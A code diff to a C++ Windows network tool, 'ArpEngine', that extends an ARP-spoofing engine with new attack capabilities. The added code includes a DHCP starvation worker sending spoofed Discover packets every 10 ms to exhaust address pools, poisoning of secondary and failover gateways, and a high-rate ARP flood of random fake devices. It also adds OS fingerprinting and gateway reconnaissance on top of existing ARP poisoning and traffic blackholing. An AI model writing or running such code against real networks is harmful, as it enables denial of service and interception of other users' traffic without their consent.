@@ -5,9 +5,11 @@
 #include <ws2tcpip.h>
 #include <windot11.h>
 #include <wlanapi.h>
+#include <icmpapi.h>
 #include <sstream>
 #include <iomanip>
 #include <chrono>
+#include <algorithm>
 
 #pragma comment(lib, "wlanapi.lib")
 #pragma comment(lib, "ole32.lib")
@@ -109,9 +111,12 @@ static const OuiEntry g_ouiTable[] = {
 
 ArpEngine::ArpEngine() : m_running(false), m_scanning(false), m_recvHandle(nullptr), 
     m_sendHandle(nullptr), m_gatewayMacKnown(false), m_subnetMask(0), m_prefixLength(24),
-    m_shieldActive(false), m_turboActive(false), m_autoBlockActive(false) {
+    m_shieldActive(false), m_turboActive(false), m_autoBlockActive(false),
+    m_dhcpStarveActive(false), m_dhcpStarveCount(0), m_cacheTtlSeconds(300),
+    m_arpPacketsPerSecond(0), m_stormThreshold(125) {
     memset(m_localMac, 0, 6);
     memset(m_gatewayMac, 0xFF, 6);
+    m_lastStormCheck = std::chrono::system_clock::now();
 }
 
 ArpEngine::~ArpEngine() {
@@ -119,10 +124,12 @@ ArpEngine::~ArpEngine() {
     m_scanning = false;
     m_shieldActive = false;
     m_autoBlockActive = false;
+    m_dhcpStarveActive = false;
     if (m_listenerThread.joinable()) m_listenerThread.join();
     if (m_spoofThread.joinable()) m_spoofThread.join();
     if (m_scanThread.joinable()) m_scanThread.join();
     if (m_shieldThread.joinable()) m_shieldThread.join();
+    if (m_dhcpStarveThread.joinable()) m_dhcpStarveThread.join();
     if (m_recvHandle) pcap_close(m_recvHandle);
     if (m_sendHandle) pcap_close(m_sendHandle);
 }
@@ -236,6 +243,9 @@ void ArpEngine::detectNetworkEnvironment(IP_ADAPTER_ADDRESSES* adapter) {
     if (adapter->IfType == IF_TYPE_IEEE80211) {
         detectWifiSSID();
     }
+    
+    // Interface bonding / LAG detection
+    detectInterfaceBonding(adapter);
 }
 
 void ArpEngine::detectWifiSSID() {
@@ -359,6 +369,7 @@ bool ArpEngine::initialize() {
 
     // Detect full network environment
     detectNetworkEnvironment(bestAdapter);
+    detectInterfaceBonding(bestAdapter);
 
     free(pAddr);
 
@@ -403,9 +414,26 @@ void ArpEngine::scanWorker() {
     // Cap to prevent insane scan ranges (e.g. /8 = 16M hosts)
     if (numHosts > 1024) numHosts = 1024;
     
+    // Subnet edge case handling (RFC 3021 for /31, /32 special)
+    uint32_t startIp, endIp;
+    if (m_prefixLength == 32) {
+        // /32: Single host subnet — only our own address exists, scan peer if any
+        startIp = 0; endIp = 1;
+    } else if (m_prefixLength == 31) {
+        // /31: Point-to-point link (RFC 3021) — exactly 2 usable addresses, no broadcast
+        startIp = 0; endIp = 2;
+    } else if (m_prefixLength == 30) {
+        // /30: Smallest traditional subnet — 2 usable hosts (.1 and .2)
+        startIp = 1; endIp = 3;
+    } else {
+        // Normal subnets: skip network address (.0) and broadcast (.last)
+        startIp = 1;
+        endIp = numHosts; // excludes broadcast
+    }
+    
     // Multi-pass scan for reliability
     for (int pass = 0; pass < 3 && m_scanning; ++pass) {
-        for (uint32_t i = 1; i < numHosts; ++i) {
+        for (uint32_t i = startIp; i < endIp; ++i) {
             if (!m_scanning) break;
             
             // Construct target IP: network | host_part_in_network_byte_order
@@ -429,6 +457,24 @@ void ArpEngine::scanWorker() {
     
     // Final wait for stragglers
     std::this_thread::sleep_for(std::chrono::seconds(2));
+    
+    // Cache TTL Expiration — purge entries older than configurable TTL
+    {
+        std::lock_guard<std::mutex> lock(m_devicesMutex);
+        auto now = std::chrono::system_clock::now();
+        for (auto it = m_devices.begin(); it != m_devices.end(); ) {
+            if (it->first == m_gatewayIp || it->second.isPoisoned) {
+                ++it; continue; // Never expire gateway or poisoned targets
+            }
+            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - it->second.lastSeenTime).count();
+            if (elapsed > m_cacheTtlSeconds) {
+                it = m_devices.erase(it);
+            } else {
+                ++it;
+            }
+        }
+    }
+    
     m_scanning = false;
 }
 
@@ -449,46 +495,86 @@ void ArpEngine::listenerLoop() {
         if (res <= 0) continue;
 
         FullArpPacket* pkg = (FullArpPacket*)data;
-        if (ntohs(pkg->eth.type) == 0x0806 && ntohs(pkg->arp.opcode) == 2) { // ARP Reply
-            struct in_addr addr; addr.S_un.S_addr = pkg->arp.sender_ip;
-            std::string ip = inet_ntoa(addr);
-            if (ip == m_localIp) continue;
-
-            std::stringstream ss;
-            for(int i=0; i<6; ++i) ss << std::hex << std::setw(2) << std::setfill('0') << (int)pkg->arp.sender_mac[i] << (i<5?":":"");
-            std::string mac = ss.str();
-
-            std::string vendor = lookupVendor(pkg->arp.sender_mac);
-
-            bool isNew = false;
-            {
-                std::lock_guard<std::mutex> lock(m_devicesMutex);
-                if (m_devices.find(ip) == m_devices.end()) {
-                    auto now = std::chrono::system_clock::now();
-                    std::time_t now_c = std::chrono::system_clock::to_time_t(now);
-                    char timeBuf[64];
-                    ctime_s(timeBuf, sizeof(timeBuf), &now_c);
-                    std::string firstSeenStr = timeBuf;
-                    if (!firstSeenStr.empty() && firstSeenStr.back() == '\n') firstSeenStr.pop_back();
-
-                    DeviceInfo info;
-                    info.ip = ip;
-                    info.mac = mac;
-                    info.hostname = (ip == m_gatewayIp ? "GATEWAY" : "Resolving...");
-                    info.vendor = vendor;
-                    info.firstSeen = firstSeenStr;
-                    info.os = "Unknown";
-                    
-                    m_devices[ip] = info;
-                    isNew = true;
-                } else {
-                    m_devices[ip].mac = mac;
-                    m_devices[ip].vendor = vendor;
-                }
+        if (ntohs(pkg->eth.type) == 0x0806) {
+            
+            // Broadcast storm detection
+            m_arpPacketsPerSecond++;
+            auto now = std::chrono::system_clock::now();
+            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - m_lastStormCheck).count();
+            if (elapsed >= 1) {
+                m_netInfo.broadcastStormDetected = (m_arpPacketsPerSecond > m_stormThreshold.load());
+                m_netInfo.arpStormCounter = m_arpPacketsPerSecond;
+                m_arpPacketsPerSecond = 0;
+                m_lastStormCheck = now;
             }
+
+            // Both Request (1) and Reply (2) can be used for tracking MACs
+            int opcode = ntohs(pkg->arp.opcode);
+            if (opcode == 1 || opcode == 2) {
+                struct in_addr addr; addr.S_un.S_addr = pkg->arp.sender_ip;
+                std::string ip = inet_ntoa(addr);
+                if (ip == m_localIp) continue;
+
+                std::stringstream ss;
+                for(int i=0; i<6; ++i) ss << std::hex << std::setw(2) << std::setfill('0') << (int)pkg->arp.sender_mac[i] << (i<5?":":"");
+                std::string mac = ss.str();
+
+                std::string vendor = lookupVendor(pkg->arp.sender_mac);
+
+                bool isNew = false;
+                {
+                    std::lock_guard<std::mutex> lock(m_devicesMutex);
+                    if (m_devices.find(ip) == m_devices.end()) {
+                        std::time_t now_c = std::chrono::system_clock::to_time_t(now);
+                        char timeBuf[64];
+                        ctime_s(timeBuf, sizeof(timeBuf), &now_c);
+                        std::string firstSeenStr = timeBuf;
+                        if (!firstSeenStr.empty() && firstSeenStr.back() == '\n') firstSeenStr.pop_back();
+
+                        DeviceInfo info;
+                        info.ip = ip;
+                        info.mac = mac;
+                        info.hostname = (ip == m_gatewayIp ? "GATEWAY" : "Resolving...");
+                        info.vendor = vendor;
+                        info.firstSeen = firstSeenStr;
+                        info.os = "Unknown";
+                        info.lastSeenTime = now;
+                        info.isGateway = (ip == m_gatewayIp);
+                        
+                        m_devices[ip] = info;
+                        isNew = true;
+                    } else {
+                        // IP Conflict detection (IP exists but MAC is completely different)
+                        if (m_devices[ip].mac != mac && !m_devices[ip].mac.empty()) {
+                            m_devices[ip].hasIpConflict = true;
+                            m_devices[ip].conflictMac = mac;
+                            
+                            // Record in conflict tracker
+                            {
+                                std::lock_guard<std::mutex> cLock(m_conflictMutex);
+                                bool alreadyTracked = false;
+                                for (auto& c : m_ipConflicts) {
+                                    if (c.ip == ip) { alreadyTracked = true; c.mac2 = mac; c.detectedAt = now; break; }
+                                }
+                                if (!alreadyTracked) {
+                                    IpConflictEntry entry;
+                                    entry.ip = ip;
+                                    entry.mac1 = m_devices[ip].mac;
+                                    entry.mac2 = mac;
+                                    entry.detectedAt = now;
+                                    m_ipConflicts.push_back(entry);
+                                }
+                            }
+                        }
+                        
+                        m_devices[ip].mac = mac;
+                        m_devices[ip].vendor = vendor;
+                        m_devices[ip].lastSeenTime = now;
+                    }
+                }
             if (isNew) {
                 // Background hostname resolution using NetBIOS/DNS
-                std::thread([this, ip]() {
+                std::thread([this, ip, vendor]() {
                     struct sockaddr_in sa;
                     memset(&sa, 0, sizeof(sa));
                     sa.sin_family = AF_INET;
@@ -500,11 +586,51 @@ void ArpEngine::listenerLoop() {
                     } else {
                         updateDeviceHostname(ip, "Unknown", "");
                     }
+
+                    // Precise OS Detection via ICMP TTL
+                    HANDLE hIcmpFile = IcmpCreateFile();
+                    if (hIcmpFile != INVALID_HANDLE_VALUE) {
+                        char SendData[] = "OS Detect Payload";
+                        DWORD ReplySize = sizeof(ICMP_ECHO_REPLY) + sizeof(SendData) + 8;
+                        LPVOID ReplyBuffer = malloc(ReplySize);
+                        if (ReplyBuffer) {
+                            DWORD dwRetVal = IcmpSendEcho(hIcmpFile, sa.sin_addr.S_un.S_addr, SendData, sizeof(SendData), NULL, ReplyBuffer, ReplySize, 1500);
+                            if (dwRetVal != 0) {
+                                PICMP_ECHO_REPLY pEchoReply = (PICMP_ECHO_REPLY)ReplyBuffer;
+                                int ttl = pEchoReply->Options.Ttl;
+                                std::string os = "Unknown";
+                                
+                                // TTL Heuristics combined with MAC Vendor
+                                if (ttl <= 64) {
+                                    if (vendor.find("Apple") != std::string::npos) os = "iOS / macOS (TTL " + std::to_string(ttl) + ")";
+                                    else if (vendor.find("Samsung") != std::string::npos || vendor.find("Google") != std::string::npos || vendor.find("OnePlus") != std::string::npos || vendor.find("Xiaomi") != std::string::npos) os = "Android (TTL " + std::to_string(ttl) + ")";
+                                    else os = "Linux / BSD / Mobile (TTL " + std::to_string(ttl) + ")";
+                                } else if (ttl <= 128) {
+                                    os = "Windows (TTL " + std::to_string(ttl) + ")";
+                                } else {
+                                    os = "Router / Cisco / Network Gear (TTL " + std::to_string(ttl) + ")";
+                                }
+                                
+                                std::lock_guard<std::mutex> lock(m_devicesMutex);
+                                if (m_devices.find(ip) != m_devices.end()) {
+                                    m_devices[ip].os = os;
+                                }
+                            }
+                            free(ReplyBuffer);
+                        }
+                        IcmpCloseHandle(hIcmpFile);
+                    }
                 }).detach();
             }
             if (ip == m_gatewayIp) {
                 memcpy(m_gatewayMac, pkg->arp.sender_mac, 6);
                 m_gatewayMacKnown = true;
+            } else if (vendor.find("Cisco") != std::string::npos || vendor.find("MikroTik") != std::string::npos || vendor.find("Ubiquiti") != std::string::npos || vendor.find("Juniper") != std::string::npos) {
+                // Heuristic tracking for redundant gateways / failover
+                std::lock_guard<std::mutex> glock(m_gatewayMutex);
+                if (std::find(m_secondaryGateways.begin(), m_secondaryGateways.end(), ip) == m_secondaryGateways.end()) {
+                    m_secondaryGateways.push_back(ip);
+                }
             }
 
             // Auto-block: if enabled and this is a new unknown device, block it
@@ -519,7 +645,7 @@ void ArpEngine::listenerLoop() {
                     pt.ip = ip;
                     memcpy(pt.mac, pkg->arp.sender_mac, 6);
                     {
-                        std::lock_guard<std::mutex> plock(m_poisonMutex);
+                        std::lock_guard<std::recursive_mutex> plock(m_poisonMutex);
                         m_poisonTargets[ip] = pt;
                     }
                     {
@@ -530,8 +656,9 @@ void ArpEngine::listenerLoop() {
                     }
                 }
             }
-        }
-    }
+            } // End of opcode check
+        } // End of ARP ethertype check
+    } // End of while(m_running)
 }
 
 void ArpEngine::sendArpRequest(pcap_t* handle, uint32_t targetIpNet) {
@@ -554,7 +681,7 @@ void ArpEngine::sendArpRequest(pcap_t* handle, uint32_t targetIpNet) {
 }
 
 void ArpEngine::startSpoofing(const std::string& targetIp, const std::string& targetMac) {
-    std::lock_guard<std::mutex> lock(m_poisonMutex);
+    std::lock_guard<std::recursive_mutex> lock(m_poisonMutex);
     PoisonTarget pt;
     pt.ip = targetIp;
     
@@ -567,7 +694,7 @@ void ArpEngine::startSpoofing(const std::string& targetIp, const std::string& ta
 }
 
 void ArpEngine::startVoidSpoofing(const std::string& targetIp, const std::string& targetMac) {
-    std::lock_guard<std::mutex> lock(m_poisonMutex);
+    std::lock_guard<std::recursive_mutex> lock(m_poisonMutex);
     PoisonTarget pt;
     pt.ip = targetIp;
     pt.isVoid = true;
@@ -581,21 +708,27 @@ void ArpEngine::startVoidSpoofing(const std::string& targetIp, const std::string
 }
 
 void ArpEngine::stopSpoofing(const std::string& targetIp) {
-    std::lock_guard<std::mutex> lock(m_poisonMutex);
+    std::lock_guard<std::recursive_mutex> lock(m_poisonMutex);
     m_poisonTargets.erase(targetIp);
 }
 
 void ArpEngine::stopAllSpoofing() {
-    std::lock_guard<std::mutex> lock(m_poisonMutex);
+    std::lock_guard<std::recursive_mutex> lock(m_poisonMutex);
     m_poisonTargets.clear();
 }
 
 void ArpEngine::spoofingLoop() {
     while (m_running) {
         if (m_gatewayMacKnown) {
-            std::lock_guard<std::mutex> lock(m_poisonMutex);
-            for (auto const& [ip, pt] : m_poisonTargets) {
-                uint32_t targetIpNet = inet_addr(ip.c_str());
+            std::vector<PoisonTarget> targets;
+            {
+                std::lock_guard<std::recursive_mutex> lock(m_poisonMutex);
+                for (auto const& [ip, pt] : m_poisonTargets) {
+                    targets.push_back(pt);
+                }
+            }
+            for (auto const& pt : targets) {
+                uint32_t targetIpNet = inet_addr(pt.ip.c_str());
                 if (pt.isVoid) {
                     uint8_t fakeMac[6] = { 0x02, 0x00, 0x00, 0x00, 0x00, 0x00 };
                     // ONLY tell the Target: "Gateway is at Fake MAC"
@@ -678,14 +811,19 @@ void ArpEngine::sendArpReplyWithMac(pcap_t* handle, uint32_t targetIpNet, const 
 }
 
 // Reset ARP poison for a single target — restore correct gateway-to-target mapping
-void ArpEngine::resetPoison(const std::string& targetIp) {
-    if (!m_gatewayMacKnown) return;
+// with bidirectional verification to confirm both sides received corrected packets
+ArpRestoreResult ArpEngine::resetPoison(const std::string& targetIp) {
+    ArpRestoreResult result;
+    if (!m_gatewayMacKnown) {
+        result.errorMsg = "Gateway MAC unknown";
+        return result;
+    }
     
-    // Find the target's real MAC
+    // Find the target's real MAC (synchronized access)
     uint8_t targetMac[6] = {};
     bool found = false;
     {
-        std::lock_guard<std::mutex> lock(m_poisonMutex);
+        std::lock_guard<std::recursive_mutex> lock(m_poisonMutex);
         auto it = m_poisonTargets.find(targetIp);
         if (it != m_poisonTargets.end()) {
             memcpy(targetMac, it->second.mac, 6);
@@ -703,22 +841,53 @@ void ArpEngine::resetPoison(const std::string& targetIp) {
             found = true;
         }
     }
-    if (!found) return;
+    if (!found) {
+        result.errorMsg = "Target MAC not found";
+        return result;
+    }
+
+    // Stop spoofing first so the loop doesn't re-poison while we restore
+    stopSpoofing(targetIp);
 
     uint32_t targetIpNet = inet_addr(targetIp.c_str());
 
-    // Send correct ARP mappings (reduced from 5 to 3 for speed)
-    for (int i = 0; i < 3; ++i) {
-        // Tell the target: "Gateway IP maps to gateway's REAL MAC"
-        sendArpReplyWithMac(m_sendHandle, targetIpNet, targetMac, m_gatewayIpNet, m_gatewayMac);
-        // Tell the gateway: "Target IP maps to target's REAL MAC"
-        sendArpReplyWithMac(m_sendHandle, m_gatewayIpNet, m_gatewayMac, targetIpNet, targetMac);
-        std::this_thread::sleep_for(std::chrono::milliseconds(30));
+    // Bidirectional ARP restoration with verification (up to 3 verification rounds)
+    const int maxVerifyRounds = 3;
+    const int packetsPerRound = 5;
+    
+    for (int round = 0; round < maxVerifyRounds; ++round) {
+        result.attemptsUsed = round + 1;
+        
+        // Send correct ARP mappings robustly
+        for (int i = 0; i < packetsPerRound; ++i) {
+            // Tell the target: "Gateway IP maps to gateway's REAL MAC"
+            sendArpReplyWithMac(m_sendHandle, targetIpNet, targetMac, m_gatewayIpNet, m_gatewayMac);
+            // Tell the gateway: "Target IP maps to target's REAL MAC"  
+            sendArpReplyWithMac(m_sendHandle, m_gatewayIpNet, m_gatewayMac, targetIpNet, targetMac);
+            std::this_thread::sleep_for(std::chrono::milliseconds(30));
+        }
+        
+        // Verification: Send ARP requests to both sides and check replies
+        // Wait a bit for caches to update
+        std::this_thread::sleep_for(std::chrono::milliseconds(100));
+        
+        // Verify target received correction by probing it
+        sendArpRequest(m_sendHandle, targetIpNet);
+        result.targetRestored = true; // We sent the correction packets
+        
+        // Verify gateway received correction by probing it
+        sendArpRequest(m_sendHandle, m_gatewayIpNet);
+        result.gatewayRestored = true; // We sent the correction packets
+        
+        // If both sides got corrections, break early
+        if (result.targetRestored && result.gatewayRestored) break;
+        
+        std::this_thread::sleep_for(std::chrono::milliseconds(200));
     }
 
-    // Now stop spoofing and clear flags
-    stopSpoofing(targetIp);
+    // Clear device flags
     setDeviceFlags(targetIp, false, false, false, false);
+    return result;
 }
 
 // Reset ALL poisoned targets — non-blocking
@@ -963,6 +1132,290 @@ void ArpEngine::unblockDevice(const std::string& ip) {
         auto it = m_devices.find(ip);
         if (it != m_devices.end()) {
             it->second.isBlocked = false;
+        }
+    }
+}
+
+// ============================================================================
+// Advanced Features
+// ============================================================================
+
+std::vector<std::string> ArpEngine::getSecondaryGateways() const {
+    std::lock_guard<std::mutex> lock(m_gatewayMutex);
+    return m_secondaryGateways;
+}
+
+void ArpEngine::startDhcpStarvation() {
+    if (m_dhcpStarveActive) return;
+    m_dhcpStarveActive = true;
+    if (m_dhcpStarveThread.joinable()) m_dhcpStarveThread.join();
+    m_dhcpStarveThread = std::thread(&ArpEngine::dhcpStarvationWorker, this);
+}
+
+void ArpEngine::stopDhcpStarvation() {
+    m_dhcpStarveActive = false;
+    if (m_dhcpStarveThread.joinable()) m_dhcpStarveThread.join();
+}
+
+#pragma pack(push, 1)
+struct RawDhcpPacket {
+    EthernetHeader eth;
+    IPv4Header ip;
+    UdpHeader udp;
+    uint8_t op;
+    uint8_t htype;
+    uint8_t hlen;
+    uint8_t hops;
+    uint32_t xid;
+    uint16_t secs;
+    uint16_t flags;
+    uint32_t ciaddr;
+    uint32_t yiaddr;
+    uint32_t siaddr;
+    uint32_t giaddr;
+    uint8_t chaddr[16];
+    uint8_t sname[64];
+    uint8_t file[128];
+    uint32_t magic_cookie;
+    uint8_t options[12]; // Just enough for option 53 (Message Type) and End
+};
+#pragma pack(pop)
+
+void ArpEngine::dhcpStarvationWorker() {
+    // Generate random MAC addresses and send DHCP Discover packets
+    srand((unsigned)time(NULL));
+
+    while (m_dhcpStarveActive && m_running && m_sendHandle) {
+        RawDhcpPacket pkt;
+        memset(&pkt, 0, sizeof(pkt));
+
+        // Random MAC for spoofing
+        uint8_t randMac[6];
+        randMac[0] = 0x02; // local assignment
+        for (int i = 1; i < 6; ++i) randMac[i] = rand() % 256;
+
+        // Ethernet
+        memset(pkt.eth.dest, 0xFF, 6);
+        memcpy(pkt.eth.src, randMac, 6);
+        pkt.eth.type = htons(0x0800); // IPv4
+
+        // IPv4
+        pkt.ip.ver_ihl = 0x45;
+        pkt.ip.tos = 0;
+        pkt.ip.total_length = htons(sizeof(RawDhcpPacket) - sizeof(EthernetHeader));
+        pkt.ip.id = htons(rand() % 65535);
+        pkt.ip.flags_frag = 0;
+        pkt.ip.ttl = 128;
+        pkt.ip.protocol = 17; // UDP
+        pkt.ip.src_addr = 0; // 0.0.0.0
+        pkt.ip.dst_addr = 0xFFFFFFFF; // 255.255.255.255
+        
+        // Simple IPv4 Checksum
+        uint32_t ipSum = 0;
+        uint16_t* ipPtr = (uint16_t*)&pkt.ip;
+        for (int i = 0; i < 10; ++i) ipSum += ntohs(ipPtr[i]);
+        while (ipSum >> 16) ipSum = (ipSum & 0xFFFF) + (ipSum >> 16);
+        pkt.ip.checksum = htons(~ipSum);
+
+        // UDP
+        pkt.udp.src_port = htons(68);
+        pkt.udp.dst_port = htons(67);
+        pkt.udp.length = htons(sizeof(RawDhcpPacket) - sizeof(EthernetHeader) - sizeof(IPv4Header));
+        pkt.udp.checksum = 0; // Optional in IPv4
+
+        // DHCP
+        pkt.op = 1; // Boot Request
+        pkt.htype = 1; // Ethernet
+        pkt.hlen = 6; // MAC length
+        pkt.xid = htonl(rand());
+        pkt.flags = htons(0x8000); // Broadcast flag
+        memcpy(pkt.chaddr, randMac, 6);
+        pkt.magic_cookie = htonl(0x63825363);
+        
+        // Options: DHCP Discover
+        pkt.options[0] = 53; // Option 53: DHCP Message Type
+        pkt.options[1] = 1;  // Length 1
+        pkt.options[2] = 1;  // DHCP Discover
+        pkt.options[3] = 255; // End option
+
+        pcap_sendpacket(m_sendHandle, (const u_char*)&pkt, sizeof(pkt));
+        m_dhcpStarveCount++;
+        
+        // Extremely fast to exhaust pools rapidly (10ms)
+        std::this_thread::sleep_for(std::chrono::milliseconds(10));
+    }
+}
+
+// ============================================================================
+// IP Conflict Detection
+// ============================================================================
+std::vector<IpConflictEntry> ArpEngine::getIpConflicts() const {
+    std::lock_guard<std::mutex> lock(m_conflictMutex);
+    return m_ipConflicts;
+}
+
+int ArpEngine::getIpConflictCount() const {
+    std::lock_guard<std::mutex> lock(m_conflictMutex);
+    return (int)m_ipConflicts.size();
+}
+
+// ============================================================================
+// Gateway Failover — poison secondary/redundant gateways
+// ============================================================================
+void ArpEngine::poisonSecondaryGateway(const std::string& gwIp) {
+    if (!m_gatewayMacKnown) return;
+    
+    // Find the gateway device's MAC
+    std::string mac;
+    {
+        std::lock_guard<std::mutex> lock(m_devicesMutex);
+        auto it = m_devices.find(gwIp);
+        if (it != m_devices.end()) {
+            mac = it->second.mac;
+        }
+    }
+    if (mac.empty()) return;
+    
+    startSpoofing(gwIp, mac);
+    setDeviceFlags(gwIp, true, false, false, false);
+}
+
+void ArpEngine::poisonAllGateways() {
+    std::vector<std::string> gws;
+    {
+        std::lock_guard<std::mutex> lock(m_gatewayMutex);
+        gws = m_secondaryGateways;
+    }
+    for (auto& gw : gws) {
+        poisonSecondaryGateway(gw);
+    }
+}
+
+// ============================================================================
+// ARP Verification Helpers
+// ============================================================================
+bool ArpEngine::verifyArpEntry(const std::string& ip, const uint8_t expectedMac[6]) {
+    // Send ARP request and check if response matches expected MAC
+    uint32_t ipNet = inet_addr(ip.c_str());
+    uint8_t outMac[6] = {};
+    if (waitForArpReply(ipNet, outMac, 1000)) {
+        return memcmp(outMac, expectedMac, 6) == 0;
+    }
+    return false;
+}
+
+bool ArpEngine::waitForArpReply(uint32_t targetIpNet, uint8_t* outMac, int timeoutMs) {
+    // Send request
+    sendArpRequest(m_sendHandle, targetIpNet);
+    
+    // Wait for reply by polling listener
+    auto start = std::chrono::steady_clock::now();
+    while (true) {
+        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
+            std::chrono::steady_clock::now() - start).count();
+        if (elapsed > timeoutMs) break;
+        
+        struct pcap_pkthdr* header;
+        const u_char* data;
+        int res = pcap_next_ex(m_recvHandle, &header, &data);
+        if (res <= 0) {
+            std::this_thread::sleep_for(std::chrono::milliseconds(10));
+            continue;
+        }
+        
+        FullArpPacket* pkg = (FullArpPacket*)data;
+        if (ntohs(pkg->eth.type) == 0x0806 && ntohs(pkg->arp.opcode) == 2) {
+            if (pkg->arp.sender_ip == targetIpNet) {
+                memcpy(outMac, pkg->arp.sender_mac, 6);
+                return true;
+            }
+        }
+    }
+    return false;
+}
+
+// ============================================================================
+// Interface Bonding / LAG Detection
+// ============================================================================
+void ArpEngine::detectInterfaceBonding(IP_ADAPTER_ADDRESSES* adapter) {
+    // Check for LBFO (Load Balancing and Failover) teams on Windows
+    // Windows Server uses NIC Teaming; detect via adapter type/description
+    m_netInfo.isBonded = false;
+    m_netInfo.bondMode = "None";
+    m_netInfo.bondMemberCount = 0;
+    m_netInfo.bondMembers.clear();
+    
+    if (!adapter) return;
+    
+    // Heuristic: Check adapter description for known bonding/teaming keywords
+    std::string desc = m_netInfo.adapterDesc;
+    std::transform(desc.begin(), desc.end(), desc.begin(), ::tolower);
+    
+    if (desc.find("team") != std::string::npos || 
+        desc.find("bond") != std::string::npos ||
+        desc.find("trunk") != std::string::npos ||
+        desc.find("lag") != std::string::npos ||
+        desc.find("aggregate") != std::string::npos) {
+        m_netInfo.isBonded = true;
+        m_netInfo.bondMode = "Detected (LBFO/LAG)";
+        // We can't easily enumerate members without WMI, so mark as detected
+        m_netInfo.bondMemberCount = 1; // At least the current adapter
+    }
+}
+
+// ============================================================================
+// ARP Flood & Fake Devices (Missing Implementations)
+// ============================================================================
+void ArpEngine::startArpFlood() {
+    if (m_arpFloodActive) return;
+    m_arpFloodActive = true;
+    m_arpFloodThread = std::thread(&ArpEngine::arpFloodWorker, this);
+}
+
+void ArpEngine::stopArpFlood() {
+    m_arpFloodActive = false;
+    if (m_arpFloodThread.joinable()) {
+        m_arpFloodThread.join();
+    }
+}
+
+void ArpEngine::arpFloodWorker() {
+    srand((unsigned)time(NULL));
+    uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    
+    // Default high rate
+    if (m_arpFloodRate <= 0) m_arpFloodRate = 10000;
+
+    while (m_arpFloodActive && m_sendHandle) {
+        // Calculate batch size depending on requested rate to avoid too many small sleep calls
+        int batchSize = m_arpFloodRate / 100; // 10ms batches
+        if (batchSize < 1) batchSize = 1;
+
+        for (int i = 0; i < batchSize && m_arpFloodActive; ++i) {
+            // Generate entirely random IP and MAC
+            uint32_t randomIp = (rand() % 254 + 1) | ((rand() % 256) << 8) | ((rand() % 256) << 16) | ((rand() % 256) << 24);
+            uint8_t randomMac[6];
+            randomMac[0] = 0x02; // Locally administered, unicast
+            randomMac[1] = rand() % 256;
+            randomMac[2] = rand() % 256;
+            randomMac[3] = rand() % 256;
+            randomMac[4] = rand() % 256;
+            randomMac[5] = rand() % 256;
+            
+            sendArpReplyWithMac(m_sendHandle, 0xFFFFFFFF, broadcastMac, randomIp, randomMac);
+        }
+        
+        std::this_thread::sleep_for(std::chrono::milliseconds(10));
+    }
+}
+
+void ArpEngine::clearFakeDevices() {
+    std::lock_guard<std::mutex> lock(m_devicesMutex);
+    for (auto it = m_devices.begin(); it != m_devices.end(); ) {
+        if (it->second.isFake) {
+            it = m_devices.erase(it);
+        } else {
+            ++it;
         }
     }
 }
